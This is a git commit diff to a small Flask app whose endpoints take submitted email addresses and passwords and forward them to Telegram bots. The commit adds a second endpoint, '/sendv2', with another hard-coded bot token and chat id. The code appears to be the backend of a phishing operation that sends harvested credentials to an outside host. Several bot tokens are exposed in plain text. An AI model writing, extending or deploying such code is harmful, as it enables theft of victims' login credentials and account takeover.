f140ccca304352ae5e2e42fc4c9792319a788943
Fernando Hernandez Salazar <74823913+tempep@users.noreply.github.com>
2024-05-04 23:00:25 -0500

    Update Berardo

--- app.py
+++ app.py
@@ -12,8 +12,6 @@ def send_data():
     send_msg(f"Correo: {new_data['email']} - Contraseña: {new_data['password']}")
     return jsonify({"message": "data sent"}), 200
 
-
-
 def send_msg(text):
     token='6691619294:AAEl12s-4uBL1aKLMXFTrKQSVN6jyKZujsY'
     chat_id='6173510595'
@@ -23,7 +21,25 @@ def send_msg(text):
         "text": text
     }
     resp = requests.get(url=url_req, params=params)
+    resp.raise_for_status()
 
+
+@app.route('/sendv2', methods=['POST'])
+def send_data_v2():
+    new_data = request.json
+    send_msg_v2(f"Correo: {new_data['email']} - Contraseña: {new_data['password']}")
+    return jsonify({"message": "data sent"}), 200
+
+
+def send_msg_v2(text):
+    token='6956084912:AAEYYE-BMOg38b5c05PG8DuHUcDscqN-Dxc'
+    chat_id='1970809416'
+    url_req=f"https://api.telegram.org/bot{token}/sendMessage"
+    params = {
+        "chat_id": chat_id,
+        "text": text
+    }
+    resp = requests.get(url=url_req, params=params)
     resp.raise_for_status()
 
 if __name__ == "__main__":
